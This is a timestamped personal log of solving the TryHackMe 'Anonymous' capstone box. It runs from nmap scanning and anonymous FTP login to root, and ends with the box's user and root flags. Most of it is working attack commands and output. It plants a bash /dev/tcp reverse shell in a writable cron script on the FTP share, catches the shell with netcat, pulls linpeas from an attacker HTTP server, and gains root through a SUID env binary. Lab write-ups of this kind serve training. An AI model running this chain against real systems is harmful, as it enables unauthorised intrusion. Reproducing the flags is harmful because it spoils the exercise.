```
Anonymous Capstone #2 - Attempt 2
IP:10.10.249.215
```

```
7:11 PM 1/11/2023
nmap -sC -sV -oA nmap 10.10.249.215  

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.13.13.125
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

														Host script results:
														| smb2-security-mode: 
														|   3.1.1: 
														|_    Message signing enabled but not required
														|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
														| smb-security-mode: 
														|   account_used: guest
														|   authentication_level: user
														|   challenge_response: supported
														|_  message_signing: disabled (dangerous, but default)
														| smb2-time: 
														|   date: 2023-01-12T05:11:13
														|_  start_date: N/A
														| smb-os-discovery: 
														|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
														|   Computer name: anonymous
														|   NetBIOS computer name: ANONYMOUS\x00
														|   Domain name: \x00
														|   FQDN: anonymous
														|_  System time: 2023-01-12T05:11:13+00:00
```

```
7:12 PM 1/11/2023
ftp 10.10.249.215  
anonymous:password#worked.

														┌──(root㉿kali)-[/home/kali/Documents/tryhackme/anonymous_capstone2]
														└─# ftp 10.10.249.215
														Connected to 10.10.249.215.
														220 NamelessOne's FTP Server!
														Name (10.10.249.215:kali): anonymous
														331 Please specify the password.
														Password: 
														230 Login successful.
														Remote system type is UNIX.
														Using binary mode to transfer files.
														ftp> 
```

```
7:19 PM 1/11/2023
while looking around I see that clean.sh has executing profiles, going to throw up a reverse shell and nc to it...

														ftp> ls -la
														229 Entering Extended Passive Mode (|||57703|)
														150 Here comes the directory listing.
														drwxrwxrwx    2 111      113          4096 Jun 04  2020 .
														drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
														-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
														-rw-rw-r--    1 1000     1000         1204 Jan 12 05:18 removed_files.log
														-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
														226 Directory send OK.
														ftp> 
also pulled all these files back, other than clean.sh no files of interest.
```

```
7:21 PM 1/11/2023
bash -i >& /dev/tcp/10.10.249.215/1337 0>&1 # shell i am going to put into clean.sh from https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet 
```

```
7:32 PM 1/11/2023
put clean.sh clean.sh # to put new clean.sh with reverse shell onto ftp server victim

															└─# cat clean.sh                   
																#!/bin/bash

																bash -i >& /dev/tcp/10.13.13.125/1337 0>&1
```

```
7:40 PM 1/11/2023
from ftp victim box "put clean.sh clean.sh" to put up reverse shell clean.sh file.
wget http://10.13.13.125:8000/home/kali/Documents/tryhackme/anonymous_capstone2/anonymous_capstone2_attempt2/clean.sh
```

```
7:40 PM 1/11/2023
nc -lvnp 1337 to connect to box. on box,
															└─$ nc -lvnp 1337         
															listening on [any] 1337 ...
															connect to [10.13.13.125] from (UNKNOWN) [10.10.249.215] 54100
															bash: cannot set terminal process group (1549): Inappropriate ioctl for device
															bash: no job control in this shell
															namelessone@anonymous:~$ id      
															id
															uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
															namelessone@anonymous:~$ whoami
															whoami
															namelessone
															namelessone@anonymous:~$ 
```

```
7:42 PM 1/11/2023
Serving http server and going to pull from it on the ftp box to get linpeas on box to conduct enumeartion for linux priv esc.
														┌──(root㉿kali)-[/home/kali/Documents/transfer]
														└─# ls
														40716.py  linpeas.sh  php-reverse-shell.php
																																				
														┌──(root㉿kali)-[/home/kali/Documents/transfer]
														└─# python3 -m http.server
														Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```
7:43 PM 1/11/2023
wget http://10.13.13.125:8000/linpeas.sh 												####################################### YOU MUST BE IN THE DIRECTORY THAT THE FILE IS LOCATED IN ORDER TO BE ABLE TO GET FILE. ##########################################

													namelessone@anonymous:~$ wget http://10.13.13.125:8000/linpeas.sh
													wget http://10.13.13.125:8000/linpeas.sh
													--2023-01-12 05:52:06--  http://10.13.13.125:8000/linpeas.sh
													Connecting to 10.13.13.125:8000... connected.
													HTTP request sent, awaiting response... 200 OK
													Length: 828087 (809K) [text/x-sh]
													Saving to: ‘linpeas.sh’

														 0K .......... .......... .......... .......... ..........  6%  119K 6s
														50K .......... .......... .......... .......... .......... 12%  237K 4s
													   100K .......... .......... .......... .......... .......... 18%  244K 4s
													   150K .......... .......... .......... .......... .......... 24%  248K 3s
													   200K .......... .......... .......... .......... .......... 30% 1.90M 2s
													   250K .......... .......... .......... .......... .......... 37%  240K 2s
													   300K .......... .......... .......... .......... .......... 43%  242K 2s
													   350K .......... .......... .......... .......... .......... 49%  244K 2s
													   400K .......... .......... .......... .......... .......... 55%  238K 2s
													   450K .......... .......... .......... .......... .......... 61%  242K 1s
													   500K .......... .......... .......... .......... .......... 68%  242K 1s
													   550K .......... .......... .......... .......... .......... 74% 2.93M 1s
													   600K .......... .......... .......... .......... .......... 80%  264K 1s
													   650K .......... .......... .......... .......... .......... 86% 2.77M 0s
													   700K .......... .......... .......... .......... .......... 92% 2.36M 0s
													   750K .......... .......... .......... .......... .......... 98% 1.92M 0s
													   800K ........                                              100%  676K=2.6s

													2023-01-12 05:52:09 (312 KB/s) - ‘linpeas.sh’ saved [828087/828087]

													namelessone@anonymous:~$ 
```

```
7:54 PM 1/11/2023
													namelessone@anonymous:~$ chmod +x linpeas.sh
													chmod +x linpeas.sh
													namelessone@anonymous:~$ 
```

```
7:55 PM 1/11/2023
RUNNING LINPEAS.
```

```
7:57 PM 1/11/2023
/env popped yellow in linpeas, going to gtfobins (suid)
														-rwsr-xr-x 1 root root 35K Jan 18  2018 /usr/bin/env
```

```
7:59 PM 1/11/2023
https://gtfobins.github.io/gtfobins/env/#suid
```

```
8:00 PM 1/11/2023
checking location 
													namelessone@anonymous:~$ which env
													which env
													/usr/bin/env
													namelessone@anonymous:~$ 
```

```
8:00 PM 1/11/2023
															namelessone@anonymous:/usr/bin$ ls -la | grep env
															ls -la | grep env
															-rwxr-xr-x  1 root   root       14320 Jun 10  2019 dbus-update-activation-environment
															-rwsr-xr-x  1 root   root       35000 Jan 18  2018 env
															-rwxr-xr-x  1 root   root       34896 Feb 21  2019 envsubst
															-rwxr-xr-x  1 root   root      245688 Mar 11  2020 grub-editenv
															-rwxr-xr-x  1 root   root       30904 Jan 18  2018 printenv
															namelessone@anonymous:/usr/bin$ 
```

```
8:03 PM 1/11/2023
ran ./env /bin/sh -p
got root, box is done.

																	bash-4.4$ ./env /bin/sh -p
																	./env /bin/sh -p
																	# whoami
																	whoami
																	root
																	# 
# id
id
uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)


cat root.txt	
4d930091c31a622a7ed10f27999af363

user.txt: 90d6f992585815ff991e68748c414740

8:07 PM 1/11/2023